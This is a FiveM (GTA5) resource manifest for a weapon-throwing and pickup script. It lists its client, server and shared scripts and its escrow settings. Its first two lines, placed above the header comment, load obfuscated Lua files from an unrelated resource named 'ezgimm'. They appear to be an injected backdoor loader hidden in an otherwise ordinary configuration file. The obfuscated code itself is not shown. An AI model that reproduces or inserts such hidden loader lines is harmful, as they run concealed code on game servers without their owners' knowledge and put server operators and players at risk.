shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
fx_version 'adamant'
games { 'gta5' }
author 'aw3rque'
description '0RESMON WEAPON REALITY -> not much to say, just a simple script that allows you to throw your weapon, change the animation of the weapon, and also allows you to pick up the weapon. also when u get shoot from ur hand the weapon will drop.'
lua54 'yes'

client_script {
  "main/client.lua",
}

server_script {
  "@oxmysql/lib/MySQL.lua",
  "main/server.lua",
  "main/server_noescrow.lua",
}

shared_script {
  "config.lua",
  "utils.lua",
}

escrow_ignore {
  'main/server_noescrow.lua',
  'main/server.lua',
  'main/client.lua',
  'config.lua',
  'utils.lua'  
}
dependency '/assetpacks'